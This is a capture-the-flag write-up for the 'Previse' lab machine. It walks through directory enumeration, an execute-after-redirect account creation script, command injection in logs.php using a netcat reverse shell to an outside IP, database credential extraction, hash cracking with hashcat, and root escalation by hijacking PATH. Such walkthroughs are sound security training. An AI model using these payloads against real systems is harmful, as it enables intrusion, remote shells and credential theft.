previse
---

## Steps

1. gobuster to discover directories and find php files

```
gobuster dir -x php -u 10.10.11.104 -w /usr/share/wordlists/dirb/common.txt


http://previse.htb/login.php            (Status: 200) [Size: 2224]
http://previse.htb/header.php           (Status: 200) [Size: 980] 
http://previse.htb/nav.php              (Status: 200) [Size: 1248]
http://previse.htb/download.php         (Status: 302) [Size: 0] [--> login.php]
http://previse.htb/index.php            (Status: 302) [Size: 2801] [--> login.php]
http://previse.htb/footer.php           (Status: 200) [Size: 217]                 
http://previse.htb/files.php            (Status: 302) [Size: 4914] [--> login.php]
http://previse.htb/css                  (Status: 301) [Size: 308] [--> http://previse.htb/css/]
http://previse.htb/status.php           (Status: 302) [Size: 2968] [--> login.php]             
http://previse.htb/js                   (Status: 301) [Size: 307] [--> http://previse.htb/js/] 
http://previse.htb/logout.php           (Status: 302) [Size: 0] [--> login.php]                
http://previse.htb/accounts.php         (Status: 302) [Size: 3994] [--> login.php]             
http://previse.htb/config.php           (Status: 200) [Size: 0]                                
http://previse.htb/logs.php             (Status: 302) [Size: 0] [--> login.php]                
http://previse.htb/server-status        (Status: 403) [Size: 276]
```

we see a few php files, most of them with status 302, which is a redirect.

2. posting a request with while disallowing redirect

looking at the account.php, we can send a post request to add an account

```
import requests

url = "http://10.10.11.104/accounts.php"

data = {
        'username':'aaaaaa',
        'password':'aaaaaa',
        'confirm':'aaaaaa'
        }

r = requests.post(url, data=data, allow_redirects=False)

print(r.text)

```

3. downloading the siteback up and reverse shell

Once we are able to login, we can download the site backup with all the files on the site. We see this file called `logs.php`, and it accepts a post request, followed by an exec with the POST variable delim

```
<?php
session_start();
if (!isset($_SESSION['user'])) {
    header('Location: login.php');
    exit;
}
?>

<?php
if (!$_SERVER['REQUEST_METHOD'] == 'POST') {
    header('Location: login.php');
    exit;
}

/////////////////////////////////////////////////////////////////////////////////////
//I tried really hard to parse the log delims in PHP, but python was SO MUCH EASIER//
/////////////////////////////////////////////////////////////////////////////////////

$output = exec("/usr/bin/python /opt/scripts/log_process.py {$_POST['delim']}");
echo $output;

...

```

its clear here that we can achieve RCE, and we send this request for a reverse shell. keep in mind to add in the Cookie, which will indicate you have a session that is logged in

```
import requests

url = "http://10.10.11.104/logs.php"

headers = {
       'Cookie': 'PHPSESSID=55ucih7mp2c0b9bh3fmj925k6h'
        }

shell = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.19 1337 >/tmp/f"

data = {
        'delim':"; " + shell
        }

r = requests.post(url, data=data, headers=headers)
```

4. MySQL db and hashcat

In the site back up, we also see a file `config.php`, which contains the database credentials.

Within our shell, we can login to MySQL locally, and extract the password

```
> mysql -u previse -p
Enter password: mySQL_p@ssw0rd!:)
select * from accounts;

id      username        password        created_at
1       m4lwhere        $1$🧂llol$DQpmdvnb7EeuO6UaqRItf.        2021-05-27 18:18:36

```

using hashcast, we can crack the password

```
> cat $1$🧂llol$DQpmdvnb7EeuO6UaqRItf > hash

> hashcat -a 0 -m 500 hash /usr/share/wordlists/rockyou.txt
```

Using that password, we ssh into the server and get the user flag

```
ssh m4lwhere@10.10.11.104
...
cat user.txt
```

5. Root flag

Once in as the user, we see that we can execute `/opt/scripts/access_backups.sh`

upon inspection, it calls a `date` binary

```
#!/bin/bash

# We always make sure to store logs, we take security SERIOUSLY here

# I know I shouldnt run this as root but I cant figure it out programmatically on my account
# This is configured to run with cron, added to sudo so I can run as needed - we'll fix it later when there's time

gzip -c /var/log/apache2/access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_access.gz
gzip -c /var/www/file_access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_file_access.gz

```

We can inject the binary with our own, by creating a binary and adding it to our path

```
> echo "cp /root/root.txt /home/m4lwhere/" > ~/date
> echo "chmod 777 /home/m4lwhere/root.txt" >> ~/date

> export PATH=/home/m4lwhere:$PATH

> sudo ./access_backups.sh

> cat /home/m4lwhere/root.txt

```

This way, the script searches our directory `/home/m4lwhere` for any binaries named `date`, and executes it.
